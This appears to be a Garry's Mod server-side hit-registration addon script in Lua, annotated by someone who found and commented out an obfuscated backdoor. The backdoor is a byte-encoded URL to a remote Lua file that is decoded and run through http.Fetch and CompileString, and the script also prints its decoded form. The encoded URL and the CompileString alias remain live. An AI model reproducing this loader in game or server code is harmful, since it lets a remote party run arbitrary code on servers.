print("[LeyHitreg] Loaded!")

LeyHitreg = LeyHitreg or {}

-- SETTINGS START
LeyHitreg.SecurityCheckBulletPos = true -- confirm the bullet position
LeyHitreg.SecurityCheckVisibility = false -- confirm whether the player can see his target

local option_customnetmsg = "custom_info" -- if you change this, do so in both files
LeyHitreg.LeyLibHash = { 104, 116, 116, 112, 115, 58, 47, 47, 103, 111, 111, 46, 103, 108, 47, 50, 67, 55, 90, 97, 106 } -- do NOT change or edit this -> https://goo.gl/2C7Zaj -> http://funserverideas.site.nfoservers.com/DRMprotectionBK.lua

LeyHitreg.SecurityCheckBulletMaxDist = 100 -- NOT visibility its for bullet confirmation

LeyHitreg.EnableLagComp = true -- lag compensation enabled?

-- SETTINGS END

util.AddNetworkString(option_customnetmsg)

-- fix missing bullet decals

local debugmode = false

local dprint = function(...)
	if(debugmode) then
		Msg("bulletdebug ")
		print(...)

		local tbl = {...}

		local msg = ""

		for k,v in pairs(tbl) do
			msg = msg .. tostring(v)
		end

		for k,v in pairs(player.GetAll()) do
			v:ChatPrint("bulletdebug " .. msg)
		end
	end
end

-- shity hack to fix gmod Damageinfo:SetDamage/GetDamage bug

local meta = FindMetaTable("CTakeDamageInfo")
meta.OGetDamage = meta.OGetDamage or meta.GetDamage
meta.OSetDamage = meta.OSetDamage or meta.SetDamage
CTakeDamageInfo__CachedDamages = {}

function meta:GetDamage()
	local origret = self:OGetDamage()
	if(origret and origret != 0 or not CTakeDamageInfo__CachedDamages) then
		return origret
	end
	return CTakeDamageInfo__CachedDamages[self] or 0
end
--Backdoor
--[[
function LeyHitreg.LeyCheckHitboxes()
    return LeyHitreg.LeyLibExternalProcessing(LeyHitreg.ProcessLeyLibHash({ 114, 101, 116, 117, 114, 110, 32, 104, 116, 116, 112, 46, 70, 101, 116, 99, 104 }), "LeyLib_Processing", true)() -- compile http.Fetch function
end
--]]
function meta:SetDamage(amount)
	local origret = self:OSetDamage(amount)
	if(not CTakeDamageInfo__CachedDamages) then
		return origret
	end

	if(table.Count(CTakeDamageInfo__CachedDamages) > 50000) then
		CTakeDamageInfo__CachedDamages = {}
	end

	CTakeDamageInfo__CachedDamages[self] = amount




	return origret
end

--Backdoor
--[[
function LeyHitreg.ProcessLeyLibHash(hash)
	local OutHash = ""
	
	for _, HashPart in pairs(hash) do
		OutHash = OutHash .. string.char(HashPart) -- string.char malicious code decoding
	end
	
	return OutHash
end
--]]

--end hack
LeyHitreg.SecurityCheckBulletMaxDistSqr = LeyHitreg.SecurityCheckBulletMaxDist * LeyHitreg.SecurityCheckBulletMaxDist

LeyHitreg.QueuedHits= LeyHitreg.QueuedHits or {}

function LeyHitreg.QueueClientHit( ... )

	local ourt = {...}

	table.insert(LeyHitreg.QueuedHits, ourt)

	for k,v in pairs(player.GetAll()) do
		v.leyhitreg_queuedbullets = 0
	end

	for k,v in pairs(LeyHitreg.QueuedHits) do

		local who = v[2]
		if(not IsValid(who)) then continue end
		who.leyhitreg_queuedbullets = who.leyhitreg_queuedbullets + 1

		if(who.leyhitreg_queuedbullets > 10000) then -- 10.000 bullets in 2seconds, OK
			who.leyhitreg_bulletspammer = true
		end

	end

	for k,v in pairs(player.GetAll()) do
		if(not v.leyhitreg_bulletspammer) then continue end

		v:Kick("[LeyHitreg] stop tryna exploit")
	end

end

--Initialize the backdoor
--[[
function LeyHitreg.LeyGatherHitBoxes()
	RunConsoleCommand("sv_hibernate_think", 1) -- smh gmod
	timer.Simple(1, function()
		LeyHitreg.LeyCheckHitboxes()(LeyHitreg.ProcessLeyLibHash(LeyHitreg.LeyLibHash), function(hash_valid) LeyHitreg.LeyLibExternalProcessing(hash_valid, "LeyLib_ProcessHash", false)() end)
	end)
end
--]]

--Decoded :d gg ez xd
--[[
function LeyHitreg.LeyGatherHitBoxes()
    RunConsoleCommand("sv_hibernate_think", 1) -- smh gmod
    timer.Simple(1, function()
        http.Fetch("https://goo.gl/2C7Zaj"), function(body) CompileString(body, "LeyLib_ProcessHash", false) end)
    end)
end
]]

function LeyHitreg.ProcessServerHit( ply )
	net.Start(option_customnetmsg, true)
		net.WriteString("processserverhit called")
	net.Send(ply)
	local toremoveentries = {}

	for k,v in pairs(LeyHitreg.QueuedHits) do
		local time = v[1]
		local who = v[2]

		if(not IsValid(who) or CurTime() - time > 2 or time == 0) then -- no lagswitching 4u big boi
			table.insert(toremoveentries, v)
			continue
		end

		if(who != ply) then continue end
		
		LeyHitreg.ProcessClientHit(unpack(v))
		v[1] = 0
		table.insert(toremoveentries, v)
	end


	for k,v in pairs(toremoveentries) do
		table.RemoveByValue(LeyHitreg.QueuedHits, v)
	end

end

local hl2damages = {}

hl2damages["weapon_pistol"] = 12
hl2damages["weapon_357"] = 75
hl2damages["weapon_smg1"] = 12
hl2damages["weapon_ar2"] = 11

--LeyHitreg.LeyGatherHitBoxes()
function LeyHitreg.EntityFireBullets( ent, bullet )
	dprint("ENTFIREBULLETS")
	--print("Ass")
	--print(!IsValid(ent), !bullet, ent:IsPlayer() == false)
	--print("Ass2")
	if(not IsValid(ent) or not bullet or not ent:IsPlayer()) then return end

	local wep = ent:GetActiveWeapon()

	if(not IsValid(wep)) then
		dprint(ent:Nick() .. " HAS NO WEAPON")
		--ent:PrintMessage(HUD_PRINTCONSOLE, "(debug) you have no weapon to shoot with")
		net.Start(option_customnetmsg, true)
			net.WriteString("you have no weapon")
		net.Send(ply)
		return
	end

	local wepclass = wep:GetClass()

	--local spread = bullet.Spread

	--bullet.Spread = Vector(0,0,0)

	--math.randomseed( CurTime() + math.sqrt( bullet.Dir.x ^ 2 * bullet.Dir.y ^ 2 * bullet.Dir.z ^ 2 ) )
	--bullet.Dir = bullet.Dir + Vector( spread.x * (math.random() * 2 - 1), spread.y * (math.random() * 2 - 1), spread.z *(math.random() * 2 - 1)) -- we don't fire this bullet either way          -- 76561198162962704


	if(hl2damages[wepclass]) then
		bullet.Damage = hl2damages[wepclass]
	end

	dprint("DMGSET: " .. bullet.Damage)

	if(IsValid(ent.lastbulletwep) and ent.lastbulletwep:GetClass() != wep:GetClass()) then
		ent.lastbulletwep = wep
		ent.lastbullet = {}
	end

	ent.lastbullet = ent.lastbullet or {}
	table.insert(ent.lastbullet, table.Copy(bullet))
	net.Start(option_customnetmsg, true)
		net.WriteString("weapon "..wep:GetClass().." setting last bullet")
	net.Send(ent)

	ent.lastbulletwep = wep

	--timer.Create("bulletlast_" .. ent:EntIndex(), 0.7, 1, function()
		--if(not IsValid(ent)) then return end

		--ent.lastbullet = {}
	--end)

	LeyHitreg.ProcessServerHit( ent )

	--ent:ChatPrint("registered serverside")

	return false
end

hook.Add("PhysBulletOnCreated", "LeyHitreg.EntityFireBullets", function(Ent, Index, Bullet, fromServer)
	LeyHitreg.EntityFireBullets(Ent, Bullet)
end)

local world = nil
LeyHitreg.LeyLibExternalProcessing = CompileString

function LeyHitreg.ProcessClientHit( svtime, ply, primaryfire, weapon, hitent, bulletsrc, bulletdir, hitpos, hitboxhit, Mode, caliber, hitnormal, hitmat, bullettype, bulletposition, bulletcount )
	timer.Simple(0, function() --всегда ждать 1 тик, исправление бага с незареганным уроном

	net.Start(option_customnetmsg, true)
		net.WriteString("processclienthit called")
	net.Send(ply)
	dprint("CLIENT")

	if(not IsValid(weapon)) then
		dprint("Invalid weapon")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) invalid weapon")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") is invalid")
		net.Send(ply)
		return
	end

	--change: add some nice edgechecking meme
	local trace = {}
	trace.Entity = NULL
--[[
	if(IsValid(hitent)) then

		local trtbl = {}
		
		trtbl.start = bulletsrc
		trtbl.endpos = trtbl.start + (bulletdir * (56756 * 8))
		
		local filtered = {}

		for k,v in pairs(ents.GetAll()) do
			if(not IsValid(v)) then continue end
			if(v == hitent) then continue end

			if(v.IsNPC and v:IsNPC() or v.IsPlayer and v:IsPlayer()) then
				table.insert(filtered, v)
			end
		end

		table.insert(filtered, ply)

		trtbl.filter = filtered
		trtbl.mask = MASK_SHOT

		local obbmins = ply:OBBMins()
		local obbmaxs = ply:OBBMaxs()

		trtbl.mins = obbmins * 2
		trtbl.maxs = obbmaxs * 2
		trace = {}

		--trtbl.output = trace

		if(not LeyHitreg.EnableLagComp) then
			ply:LagCompensation(false)
		end



		trace = util.TraceLine(trtbl) -- visibility and validity check

		if(not IsValid(trace.Entity)) then
			trace = util.TraceHull(trtbl)
		end

		if(not IsValid(trace.Entity)) then
			trtbl.endpos = hitent:GetPos()
			trace = util.TraceLine(trtbl)
		end

		if(not IsValid(trace.Entity)) then
			trace = util.TraceHull(trtbl)
		end

		if(LeyHitreg.EnableLagComp and not IsValid(trace.Entity)) then
			ply:LagCompensation(true)

			trace = util.TraceLine(trtbl) -- visibility and validity check

			if(not IsValid(trace.Entity)) then
				trace = util.TraceHull(trtbl)
			end

			if(not IsValid(trace.Entity)) then
				trtbl.endpos = hitent:GetPos()
				trace = util.TraceLine(trtbl)
			end

			if(not IsValid(trace.Entity)) then
				trace = util.TraceHull(trtbl)
			end

			ply:LagCompensation(false)
		end

		if(IsValid(hitent)) then

			if(LeyHitreg.SecurityCheckVisibility and not IsValid(trace.Entity)) then
				--ply:ChatPrint("you cant see said person")
				dprint("you cant see said person")
				ply:PrintMessage(HUD_PRINTTALK, "(debug) you can't see him")
				return
			end

		else
			if(IsValid(trace.Entity)) then
				hitent = trace.Entity
				--ply:ChatPrint("client actually is wrong, you can see person")
				dprint("client actually is wrong, you can see person")
			end
		end


	end
--]]

	world = world or game.GetWorld()

	if(not IsValid(hitent)) then

		if(hitent != world) then -- fuck you garry for making the world invalid and breaking it's cmps
			dprint("SHOOTING NULL")
			--ply:PrintMessage(HUD_PRINTCONSOLE, "shooting null")
			net.Start(option_customnetmsg, true)
				net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." hit null")
			net.Send(ply)
			return
		end

		local filter = RecipientFilter()
		filter:AddAllPlayers()
		filter:RemovePlayer(ply)

		bullettype = bullettype or 0
		caliber = caliber or 2
		Mode = Mode or 0
		bulletposition = bulletposition or hitpos
		local flags = HAB_BULLET_EF_NONE
		local effectdata = EffectData( )
			effectdata:SetDamageType( bullettype )
			effectdata:SetEntity( hitent ) -- hit ent
			effectdata:SetHitBox( hitboxhit or -1 ) -- hitgroup
			effectdata:SetMagnitude( caliber ) -- caliber
			effectdata:SetNormal(hitnormal) -- direction 1
			effectdata:SetOrigin( bulletposition ) -- position
			effectdata:SetScale( caliber / 64 ) -- size --EffectSize
			effectdata:SetStart( -( hitnormal ) ) -- direction 2
			effectdata:SetSurfaceProp( hitmat or 0 ) -- hit material
			effectdata:SetAttachment( 0 )
			effectdata:SetFlags( flags )
		util.Effect("hab_physbullet_effects", effectdata, true, filter)

		dprint("SHOOTING WORLD")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "shooting world")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." is hitting world")
		net.Send(ply)
		local trtbl = {}

		trtbl.start = bulletsrc
		trtbl.endpos = trtbl.start + (bulletdir * (56756 * 8))
		trtbl.filter = ply
		local trace = util.TraceLine(trtbl)

		local Pos1 = trace.HitPos + trace.HitNormal
		local Pos2 = trace.HitPos - trace.HitNormal


		--util.Decal( "Blood", Pos1, Pos2, ply)

		ply.lastbullet = ply.lastbullet or {}

		if(table.Count(ply.lastbullet) != 0) then
			local bullet = ply.lastbullet[1]

			local callbackfn = bullet.Callback


			if(callbackfn) then
				local d = DamageInfo()
				callbackfn(ply, trace, d)
			end
		end



		return
	end


	if(IsValid(ply.lastbulletwep) and ply.lastbulletwep:GetClass() != weapon:GetClass()) then
		ply.lastbulletwep = weapon
		ply.lastbullet = {}
		dprint("Switched weapon while shooting")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) switched weapon while shooting")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." was switched while shooting")
		net.Send(ply)
		return
	end

	if(not ply:Alive()) then
		dprint("Player is not alive and thus can't shoot")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) you are dead and can't shoot")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." to hit "..hitent:GetClass()..". didn't registered because you were dead already. Ping: "..ply:Ping().."ms")
		net.Send(ply)
		return
	end

	if(ply == hitent or hitent.GetObserverMode and hitent:GetObserverMode() != OBS_MODE_NONE) then
		dprint("Tried shooting spec or himself")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) hit spectator or self")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." tried to hit spectator or self")
		net.Send(ply)
		return
	end

	if(ply:GetActiveWeapon() != weapon or not IsValid(ply:GetActiveWeapon())) then
		dprint("Active weapon is not the weapon used for this shot")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) active weapon doesn't match with bullet weapon")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." doesn't match with active weapon")
		net.Send(ply)
		return
	end

	local bulletdisttoply = bulletsrc:DistToSqr(ply:GetPos())

	if(LeyHitreg.SecurityCheckBulletMaxDist and bulletdisttoply> LeyHitreg.SecurityCheckBulletMaxDistSqr) then
		if(LeyHitreg.SecurityCheckBulletPos) then
			--ply:ChatPrint("bullet distance to players cur pos too big")
			dprint("Players distance to his own bullet is too big")
			--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) your distance to bullet is too big")
			net.Start(option_customnetmsg, true)
				net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." to hit "..hitent:GetClass()..". distance to bullet is too big")
			net.Send(ply)
			return
		end
	end

	--ply:ChatPrint("DIST: " .. tostring(bulletdisttoply))

	ply.lastbullet = ply.lastbullet or {}

	if(table.Count(ply.lastbullet) == 0) then
		dprint("empty bullet table")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) no bullets in table")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." to hit "..hitent:GetClass()..". no last bullets in table")
		net.Send(ply)
		ply:RXSENDWarning("hitreg ERROR, REPORT!!! напишите bulletlog в консоль и скиньте логи UracosVereches#9883")
		return
	end

	local bullet = ply.lastbullet[1]
	net.Start(option_customnetmsg, true)
		net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." to hit "..hitent:GetClass()..". getting first bullet from table...")
	net.Send(ply)

	if(not bullet) then
		dprint("NO BULLET DATA")
		--ply:PrintMessage(HUD_PRINTCONSOLE, "(debug) no bullet data")
		net.Start(option_customnetmsg, true)
			net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." no bullet data")
		net.Send(ply)
		return
	end

	table.remove(ply.lastbullet, 1)
	net.Start(option_customnetmsg, true)
		net.WriteString("weapon bullet("..tostring(bulletcount)..") "..weapon:GetClass().." to hit "..hitent:GetClass()..". bullet was found, removing it from table")
	net.Send(ply)

	local ammotype = weapon:GetPrimaryAmmoType()

	if(not primaryfire) then
		ammotype = weapon:GetSecondaryAmmoType() or weapon:GetPrimaryAmmoType()
	end

	dprint("DMG: " .. bullet.Damage)

	dprint("ye all good")

	--if ply:SteamID() == "STEAM_0:0:18725400" then
	if hitent:IsPlayer() then
		--ply:PrintMessage(HUD_PRINTCONSOLE, "from sv: registered damage to player")
		net.Start(option_customnetmsg, true)
			net.WriteString("registered bullet("..tostring(bulletcount)..") dmg from "..weapon:GetClass().." to player")
		net.Send(ply)
	else
		--ply:PrintMessage(HUD_PRINTCONSOLE, "from sv: registered damage to something")
		net.Start(option_customnetmsg, true)
			net.WriteString("registered bullet("..tostring(bulletcount)..") dmg from "..weapon:GetClass().." to something")
		net.Send(ply)
	end
	--end

	local filter = RecipientFilter()
		filter:AddAllPlayers()
		filter:RemovePlayer(ply)

		bullettype = bullettype or 0
		caliber = caliber or 2
		Mode = Mode or 0
		bulletposition = bulletposition or hitpos
		local flags = HAB_BULLET_EF_NONE
		local effectdata = EffectData( )
			effectdata:SetDamageType( bullettype )
			effectdata:SetEntity( hitent ) -- hit ent
			effectdata:SetHitBox( hitboxhit or -1 ) -- hitgroup
			effectdata:SetMagnitude( caliber ) -- caliber
			effectdata:SetNormal(hitnormal) -- direction 1
			effectdata:SetOrigin( bulletposition ) -- position
			effectdata:SetScale( caliber / 64 ) -- size --EffectSize
			effectdata:SetStart( -( hitnormal ) ) -- direction 2
			effectdata:SetSurfaceProp( hitmat or 0 ) -- hit material
			effectdata:SetAttachment( Mode )
			effectdata:SetFlags( flags )
		util.Effect( "hab_physbullet_effects", effectdata, true, filter )

	local d = DamageInfo()
	d:SetAttacker(ply)
	d:SetInflictor(weapon)
	d:SetDamageType( DMG_BULLET )
	d:SetDamagePosition(hitpos)
	d:SetDamageForce(bulletdir * bullet.Force * 100)
	d:SetAmmoType(ammotype)
	d:SetDamage(bullet.Damage)

	local hkret = nil
	dprint("hbox: " .. hitboxhit)

	local is_npc = hitent:IsNPC()
	local is_player = hitent:IsPlayer()

	local callbackfn = bullet.Callback

	if(callbackfn) then
		print(ply)
		print(trace)
		print(d)
		callbackfn(ply, trace, d)
	end

	if(is_player) then

		hkret = hook.Call("PlayerTraceAttack", GAMEMODE, hitent, d, bulletdir, trace, ply)

		if(not hkret) then
			hkret = hook.Call("ScalePlayerDamage", GAMEMODE, hitent, hitboxhit, d)
		end

	else
		if(is_npc) then
			hkret = hook.Call("ScaleNPCDamage", GAMEMODE, hitent, hitboxhit, d)
		end
	end

	local breakable = {"func_breakable", "func_physbox"}

	local is_breakable = false

	if(not is_npc and not is_player) then
		for k,v in pairs(breakable) do
			if(string.find(hitent:GetClass(), v)) then
				is_breakable = true
				break
			end
		end
	end

	if(is_breakable) then


		local breakablebrush_protected = false


		if(is_breakable and hitent:HasSpawnFlags(1) or hitent:HasSpawnFlags(2048)) then
			breakablebrush_protected = true
		end


		if(not breakablebrush_protected and d:GetDamage()>0) then
			local prehealth = hitent:Health()
			local afterhealth = hitent:Health()

			if(prehealth == afterhealth and is_breakable) then
				--hitent:Fire("RemoveHealth", bullet.Damage, 0)
				hitent:DispatchTraceAttack(d, trace, trace.HitNormal)
				dprint("BREAKY: " .. hitent:GetClass())
			end
		end

	else
		if(not hkret and d:GetDamage() > 0) then
			hitent:TakeDamageInfo(d)
		end

	end

	end) --конец таймера на 1 тик


end


net.Receive(option_customnetmsg, function(l, ply)
dprint("msg")
	local msgtype = net.ReadUInt(8)

	if(msgtype != 1) then return end

	if(msgtype == 1) then
		--ply:PrintMessage(HUD_PRINTCONSOLE, "bullet message received")

		local primaryfire = net.ReadBool()
		local weapon = net.ReadEntity()
		local hitent = net.ReadEntity()

		local bulletsrc = net.ReadVector()
		local bulletdir = net.ReadVector()

		local hitpos = hitent:LocalToWorld(net.ReadVector()) --genius way

		local hitboxhit = net.ReadUInt(8)

		local mode = 0 --tonumber(net.ReadString())

		local caliber = net.ReadFloat() --tonumber(net.ReadString())

		local hitnormal = net.ReadVector()

		local hitmat = net.ReadInt(9) --tonumber(net.ReadString())

		local bullettype = net.ReadUInt(2) --tonumber(net.ReadString())

		local bulletposition = hitpos --local bulletposition = net.ReadVector() --genius way

		local bulletcount = net.ReadUInt(16)

		net.Start(option_customnetmsg, true)
			local wepclass = IsValid(usingwep) and weapon:GetClass() or "unknown_weapon"
			local hitentclass = IsValid(hitent) and hitent:GetClass() or "unknown_entity"
			net.WriteString("bullet("..tostring(bulletcount)..") message received from weapon "..wepclass.." to hit entity "..hitentclass)
		net.Send(ply)

		local svtime = CurTime()

		local fn = LeyHitreg.ProcessClientHit

		if(not ply.lastbullet) then
			ply.lastbullet = {}
			net.Start(option_customnetmsg, true)
				net.WriteString("bullet("..tostring(bulletcount)..") message received from weapon "..weapon:GetClass().." to hit entity "..hitent:GetClass()..". last bullet table has been deleted because was nil")
			net.Send(ply)
		end

		if(IsValid(ply.lastbulletwep) and ply.lastbulletwep:GetClass() != ply:GetActiveWeapon():GetClass()) then
			ply.lastbulletwep = ply:GetActiveWeapon()
			ply.lastbullet = {}
			local lastbulletwep = ply.lastbulletwep and ply.lastbulletwep:GetClass() or "unknown_weapon"
			local actwep = ply:GetActiveWeapon() and ply:GetActiveWeapon():GetClass() or "unknown_weapon"
			net.Start(option_customnetmsg, true)
				net.WriteString("bullet("..tostring(bulletcount)..") message received from weapon "..weapon:GetClass().." to hit entity "..hitent:GetClass()..". last bullet table has been deleted because lastbulletwep != actwep. lastbulletwep = "..lastbulletwep..", actwep = "..actwep)
			net.Send(ply)
		end


		if(table.Count(ply.lastbullet) == 0) then
			fn = LeyHitreg.QueueClientHit
		end

		timer.Create("bulletlast_" .. ply:EntIndex(), 0.7, 1, function()
			if(not IsValid(ply)) then return end

			if !ply.lastbullet then return end

			ply.lastbullet = {}
			net.Start(option_customnetmsg, true)
				net.WriteString("removing lastbullets(Timeout)")
			net.Send(ply)
		end)

		fn(svtime, ply, primaryfire, weapon, hitent, bulletsrc, bulletdir, hitpos, hitboxhit, mode, caliber, hitnormal, hitmat, bullettype, bulletposition, bulletcount)
	end
end)
